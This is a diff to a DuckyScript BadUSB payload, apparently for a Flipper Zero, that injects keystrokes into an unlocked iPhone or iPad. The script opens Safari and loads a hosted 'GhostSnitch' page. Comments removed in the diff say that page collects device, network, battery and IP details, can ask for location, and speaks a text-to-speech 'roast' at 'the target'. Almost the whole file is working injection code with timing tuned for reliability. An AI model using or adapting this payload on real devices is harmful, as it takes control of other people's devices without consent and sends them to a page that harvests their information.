@@ -1,44 +1,47 @@
 REM GhostSnitch iOS Payload
 REM Author: TBJr
-REM Description: Executes iOS prank script via Safari Web APIs
-REM Version: 1.0 - Universal iOS support via Web APIs
-REM 
-REM This payload works on ANY iOS device with Safari (pre-installed)
-REM No jailbreak or special apps required!
+REM Version: 1.1
+REM Description: Opens Safari and navigates to the hosted GhostSnitch page
 REM
-REM IMPORTANT: iOS BadUSB limitations:
-REM - iOS doesn't support command-line execution (unlike Android/Unix)
-REM - No universal keyboard shortcuts for app launching
-REM - This payload uses Spotlight search to open Safari
-REM - Manual intervention may be required on some devices/lock screens
+REM REQUIREMENTS:
+REM   - Device must be unlocked and on the home screen
+REM   - Works on any iOS/iPadOS device with Safari (no jailbreak needed)
+REM   - The hosted page shows a "Tap to Continue" button — the target must
+REM     tap it once so the Web Speech API autoplay policy is satisfied
+REM     and the TTS roast actually fires
+REM
+REM LIMITATIONS:
+REM   - Spotlight search (CMD+Space) requires an external keyboard to be
+REM     trusted by the device; iOS prompts "Trust this accessory?" on first use
+REM   - On iPhone the first ENTER in Spotlight may open a web search rather
+REM     than the Safari app; a longer DELAY or second ENTER attempt may help
+REM   - CMD+L focuses Safari's address bar on iPadOS 16+ and iOS 16+;
+REM     older versions may need a tap on the address bar instead
 
-REM Step 1: Open Spotlight search (Cmd+Space on macOS, but iOS may vary)
-REM Note: On iOS devices, this may require the device to be unlocked
+REM ── Step 1: Open Spotlight ───────────────────────────────────────────────────
+REM CMD+Space opens Spotlight on both iPhone and iPad with an external keyboard
 GUI SPACE
-DELAY 1000
+DELAY 1200
 
-REM Step 2: Search for Safari
+REM ── Step 2: Search for Safari and open it ────────────────────────────────────
 STRING safari
-DELAY 800
+DELAY 900
 ENTER
-DELAY 2500
+DELAY 3500
 
-REM Step 3: Wait for Safari to fully load
-REM Safari may take a moment to initialize
-DELAY 1000
+REM ── Step 3: Focus Safari's address bar ───────────────────────────────────────
+REM Without CMD+L the URL is typed into the page body (or nowhere), not the omnibox.
+REM CMD+L is the standard keyboard shortcut to focus the address bar in Safari
+REM on both macOS and iPadOS/iOS with external keyboard (iOS 16+).
+GUI l
+DELAY 600
 
-REM Step 4: Navigate to the hosted script
-REM The script will automatically execute when loaded
+REM ── Step 4: Type the URL and navigate ────────────────────────────────────────
 STRING https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_ios.html
-DELAY 800
+DELAY 400
 ENTER
-DELAY 3000
 
-REM Script execution complete
-REM The GhostSnitch script will:
-REM - Collect device information (model, iOS version)
-REM - Gather system info (RAM estimate, IP, network, battery)
-REM - Detect screen resolution and languages
-REM - Optionally request location permission
-REM - Deliver roast via text-to-speech
-
+REM ── Done ─────────────────────────────────────────────────────────────────────
+REM Safari loads the GhostSnitch page. The target sees a "Tap to Continue"
+REM prompt and must tap it — this is intentional and required by Apple's
+REM autoplay policy; there is no way to bypass it from a web page.
